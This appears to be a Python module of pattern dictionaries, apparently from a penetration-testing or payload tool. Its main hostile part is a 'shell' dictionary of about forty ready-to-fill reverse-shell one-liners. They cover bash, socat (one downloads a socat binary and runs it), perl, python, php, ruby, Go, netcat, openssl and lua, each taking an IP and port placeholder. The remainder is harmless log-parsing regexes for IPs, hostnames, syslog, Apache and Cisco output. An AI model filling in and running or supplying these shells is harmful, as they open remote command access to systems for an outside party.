
whitespace = {
	"ANY": r"(\n|\t|\r| )+"
}

shell = {
'bash': '''bash -i >& /dev/tcp/*-IP-*/*-PORT-* 0>&1''',
'bash2': '''0<&196;exec 196<>/dev/tcp/*-IP-*/*-PORT-*; sh <&196 >&196 2>&196''',
'bash3': '''/bin/bash -l > /dev/tcp/*-IP-*/*-PORT-* 0<&1 2>&1''',
'sh': '''sh -i >& /dev/udp/*-IP-*/*-PORT-* 0>&1''',
'socat': '''/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:*-IP-*:*-PORT-*''',
'socat2': '''wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat bash4:'bash -li',pty,stderr,setsid,sigint,sane tcp:*-IP-*:*-PORT-*''',
'perl': '''use Socket;$i="*-IP-*";$p=*-PORT-*;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};''',
'perl2': '''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"*-IP-*:*-PORT-*");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''',
'perl3': '''perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"*-IP-*:*-PORT-*");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''',
'python': '''import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")''',
'python2': '''import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("*-IP-*",*-PORT-*));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")''',
'python3': '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("*-IP-*",*-PORT-*));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])''',
'python4': '''import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("*-IP-*",*-PORT-*));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())''',
'python5': '''socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("*-IP-*",*-PORT-*));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")''',
'python6': '''socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("*-IP-*",*-PORT-*));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])''',
'python7': '''socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("*-IP-*",*-PORT-*));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())''',
'python8': '''a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("*-IP-*",*-PORT-*));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")''',
'python9': '''a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("*-IP-*",*-PORT-*));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])''',
'python10': '''a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("*-IP-*",*-PORT-*));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())''',
'python11': '''a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("*-IP-*",*-PORT-*));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")''',
'python12': '''a=__import__;b=a("socket").socket;p=a("subprocess").call;o=a("os").dup2;s=b();s.connect(("*-IP-*",*-PORT-*));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])''',
'python13': '''a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("*-IP-*",*-PORT-*));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())''',
'php': '''php -r '$sock=fsockopen("*-IP-*",*-PORT-*);exec("/bin/sh -i <&3 >&3 2>&3");''',
'php2': '''php -r '$sock=fsockopen("*-IP-*",*-PORT-*);shell_exec("/bin/sh -i <&3 >&3 2>&3");''',
'php3': '''php -r '$sock=fsockopen("*-IP-*",*-PORT-*);`/bin/sh -i <&3 >&3 2>&3`;''',
'php4': '''php -r '$sock=fsockopen("*-IP-*",*-PORT-*);system("/bin/sh -i <&3 >&3 2>&3");''',
'php5': '''php -r '$sock=fsockopen("*-IP-*",*-PORT-*);passthru("/bin/sh -i <&3 >&3 2>&3");''',
'php6': '''php -r '$sock=fsockopen("*-IP-*",*-PORT-*);popen("/bin/sh -i <&3 >&3 2>&3", "r");''',
'php7': '''php -r '$sock=fsockopen("*-IP-*",*-PORT-*);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);''',
'ruby': '''ruby -rsocket -e'f=TCPSocket.open("*-IP-*",*-PORT-*).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)''',
'ruby2': '''ruby -rsocket -e'exit if fork;c=TCPSocket.new("*-IP-*","*-PORT-*");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}''',
'ruby3': '''ruby -rsocket -e 'c=TCPSocket.new("*-IP-*","*-PORT-*");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end''',
'Golang': '''echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","*-IP-*:*-PORT-*");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go''',
'netcat': '''nc -e /bin/sh *-IP-* *-PORT-*''',
'netcat2': '''nc -e /bin/bash *-IP-* *-PORT-*''',
'netcat3': '''nc -c bash *-IP-* *-PORT-*''',
'netcat4': '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc *-IP-* *-PORT-* >/tmp/f''',
'netcat5': '''rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc *-IP-* *-PORT-* >/tmp/f''',
'netcat6': '''ncat *-IP-* *-PORT-* -e /bin/bash''',
'netcat7': '''ncat --udp *-IP-* *-PORT-* -e /bin/bash''',
'openssl': '''mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect *-IP-*:*-PORT-* > /tmp/s; rm /tmp/s''',
'openssl2': '''mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE''',
'lua': '''lua -e "require('socket');require('os');t=socket.tcp();t:connect('*-IP-*','*-PORT-*');os.execute('/bin/sh -i <&3 >&3 2>&3');"'''

}

address = {
	'btc': '''([a-km-zA-HJ-NP-Z0-9]{26,34})''' # 3Nxwenay9Z8Lc9JBiywExpnEFiLp6Afp8v <- 34ch
}


net = {
	'IP': r'''(?:%{IPv4}|%{IPv6})''',
	'IPv4': r'''(?<![0-9])(?:(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})[.](?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})[.](?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})[.](?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2}))(?![0-9])''',
	'IPv6': r'''(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))''',
	'HOSTNAME': r'''(?:[0-9A-z][0-9A-z-]{0,62})(?:\.(?:[0-9A-z][0-9A-z-]{0,62}))*\.?''',
	'HOST': r'''%{HOSTNAME}''',
	'NETSTATPENT': r'''/(?:[0-9A-z][0-9A-z-]{0,62})(?:\.(?:[0-9A-z][0-9A-z-]{0,62}))*\.?''',
	'NETPENT': r'''(?:[0-9A-z][0-9A-z-]{0,62})(?:\.(?:[0-9A-z][0-9A-z-]{0,62}))*\.?/''',
	'IPORHOST': r'''(?:%{HOSTNAME}|%{IP})''',
	'PORT': r'''([0-9]{4,5}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])'''

}



base = {
	'USERNAME': r'''[a-zA-Z0-9_-]+''',
	'USER': r'''%{USERNAME}''',
	'INT': r'''(?:[+-]?(?:[0-9]+))''',
	'NUMBER': r'''(?:[+-]?(?:(?:[0-9]+(?:\.[0-9]*)?)|(?:\.[0-9]+)))''',
	'POSITIVENUM': r'''\b[0-9]+\b''',
	'WORD': r'''\w+''',
	'NOTSPACE': r'''\S+''',
	'DATA': r'''.*?''',
	'GREEDYDATA': r'''.*''',
	'QUOTEDSTRING': r'''(?:(?<!\\)(?:"(?:\\.|[^\\"])*")|(?:'(?:\\.|[^\\'])*')|(?:`(?:\\.|[^\\`])*`))''',
	'MAC': r'''(?:%{CISCOMAC}|%{WINDOWSMAC}|%{COMMONMAC})''',
	'CISCOMAC': r'''(?:(?:[A-Fa-f0-9]{4}\.){2}[A-Fa-f0-9]{4})''',
	'WINDOWSMAC': r'''(?:(?:[A-Fa-f0-9]{2}-){5}[A-Fa-f0-9]{2})''',
	'COMMONMAC': r'''(?:(?:[A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2})''',
	'IP': r'''(?:%{IPv4}|%{IPv6})''',
	'IPv4': r'''(?<![0-9])(?:(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})[.](?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})[.](?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})[.](?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2}))(?![0-9])''',
	'IPv6': r'''(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))''',
	'HOSTNAME': r'''(?:[0-9A-z][0-9A-z-]{0,62})(?:\.(?:[0-9A-z][0-9A-z-]{0,62}))*\.?''',
	'HOST': r'''%{HOSTNAME}''',
	'NETSTATPENT': r'''/(?:[0-9A-z][0-9A-z-]{0,62})(?:\.(?:[0-9A-z][0-9A-z-]{0,62}))*\.?''',
	'NETPENT': r'''(?:[0-9A-z][0-9A-z-]{0,62})(?:\.(?:[0-9A-z][0-9A-z-]{0,62}))*\.?/''',
	'IPORHOST': r'''(?:%{HOSTNAME}|%{IP})''',
	'HOSTPORT': r'''(?:%IPORHOST=~\.%:%{POSITIVENUM})''',
	'PATH': r'''(?:%{UNIXPATH}|%{WINPATH})''',
	'UNIXPATH': r'''(?<![\w\\/])(?:/(?:[\w_@:.,-]+|\\.)*)+''',
	'LINUXTTY': r'''(?:/dev/pts/%{POSITIVENUM})''',
	'BSDTTY': r'''(?:/dev/tty[pq][a-z0-9])''',
	'TTY': r'''(?:%{BSDTTY}|%LINUXTTY)''',
	'WINPATH': r'''(?:\\[^\\?*]*)+''',
	'URIPROTO': r'''[A-z]+(\+[A-z+]+)?''',
	'URIHOST': r'''%{IPORHOST}(?:%{PORT})?''',
	'URIPATH': r'''(?:/[A-z0-9$.+!*'(),~#%-]*)+''',
	'URIPARAM': r'''\?(?:[A-z0-9]+(?:=(?:[^&]*))?(?:&(?:[A-z0-9]+(?:=(?:[^&]*))?)?)*)?''',
	'URIPATHPARAM': r'''%{URIPATH}(?:%{URIPARAM})?''',
	'URI': r'''%{URIPROTO}://(?:%{USER}(?::[^@]*)?@)?(?:%{URIHOST})?(?:%{URIPATH})?(?:%{URIPARAM})?''',
	'MONTH': r'''\b(?:Jan(?:uary)?|Feb(?:ruary)?|Mar(?:ch)?|Apr(?:il)?|May|Jun(?:e)?|Jul(?:y)?|Aug(?:ust)?|Sep(?:tember)?|Oct(?:ober)?|Nov(?:ember)?|Dec(?:ember)?)\b''',
	'MONTHNUM': r'''\b(?:0?[0-9]|1[0-2])\b''',
	'MONTHDAY': r'''(?:(?:3[01]|[0-2]?[0-9]))''',
	'DAY': r'''(?:Mon(?:day)?|Tue(?:sday)?|Wed(?:nesday)?|Thu(?:rsday)?|Fri(?:day)?|Sat(?:urday)?|Sun(?:day)?)''',
	'YEAR': r'''%{INT}''',
	'TIME': r'''(?!<[0-9])(?:2[0123]|[01][0-9]):(?:[0-5][0-9])(?::(?:[0-5][0-9])(?:\.[0-9]+)?)?(?![0-9])''',
	'DATESTAMP': r'''%{INT}/%{INT}/%{INT}-%{INT}:%{INT}:%{INT}(\.%INT)?''',
	'SYSLOGDATE': r'''%{MONTH} +%{MONTHDAY} %{TIME}''',
	'PROG': r'''(?:[A-z][\w-]+(?:\/[\w-]+)?)''',
	'PID': r'''%{INT}''',
	'SYSLOGPROG': r'''%{PROG}(?:\[%{PID}\])?''',
	'NETSTAT': r'''%{PID}(?:\[%{PROG}\])?''',
	'NETSTAT2': r'''%{PID}(?\%{PROG})?''',
	'HTTPDATE': r'''%{MONTHDAY}/%{MONTH}/%{YEAR}:%{TIME} %INT:ZONE%''',
	'QS': r'''%{QUOTEDSTRING}''',
	'SYSLOGBASE': r'''%{SYSLOGDATE} %{HOSTNAME} %{SYSLOGPROG}:''',
	'COMBINEDAPACHELOG': r'''%{IPORHOST} %USER:IDENT% %USER:AUTH% \[%{HTTPDATE}\] "%{WORD} %{URIPATHPARAM} HTTP/%{NUMBER}" %NUMBER:RESPONSE% (?:%NUMBER:BYTES%|-) "(?:%URI:REFERRER%|-)" %QS:AGENT%''',
	'YESNO': r"(YES|NO)"
}

cisco = {
	"INTERFACE_METHOD": r"(RARP|SLARP|BOOTP|TFTP|manual|NVRAM|IPCP|DHCP|unset|other)",
	"INTERFACE_STATUS": r"(up|down|administratively down|up \(looped\))",
	"IP": r"((?P<ipv4>%{IPv4})|(?P<ipv6>%{IPv4})|unassigned)",
	"INTERFACE": r"(?P<interface_name>\w+(\d+((/|:)\d+)?)?(\.(?P<sub_interface>\d*))?)",
	"IP_INTERFACE_BRIEF_ROW": r"%{cisco.INTERFACE} *%{cisco.IP} *%{YESNO:interface_ok} *%{cisco.INTERFACE_METHOD:method} *%{cisco.INTERFACE_STATUS:status} *%{cisco.INTERFACE_STATUS:protocol_status}",
	"IP_INTERFACE_SUMMARY": r"(?P<interface_up>\*)? *%{cisco.INTERFACE} *(?P<packets_in_input_hold_queue>\d+) *(?P<packets_dropped_from_input_queue>\d+) *(?P<packets_in_output_hold_queue>\d+) *(?P<packets_dropped_from_output_queue>\d+) *(?P<bits_per_second_received>\d+) *(?P<packets_per_second_received>\d+) *(?P<bits_per_second_sent>\d+) *(?P<packets_per_second_sent>\d+) *(?P<throttle_count>\d+)",
	"IP_INTERFACE_MAC": r"(?: address is )(?P<mac>%{MAC})? +%{cisco.INTERFACE} +(?P<packets_in_input_hold_queue>\d+) +(?P<packets_dropped_from_input_queue>\d+) +(?P<packets_in_output_hold_queue>\d+) +(?P<packets_dropped_from_output_queue>\d+) +(?P<bits_per_second_received>\d+) +(?P<packets_per_second_received>\d+) +(?P<bits_per_second_sent>\d+) +(?P<packets_per_second_sent>\d+) +(?P<throttle_count>\d+)"
}
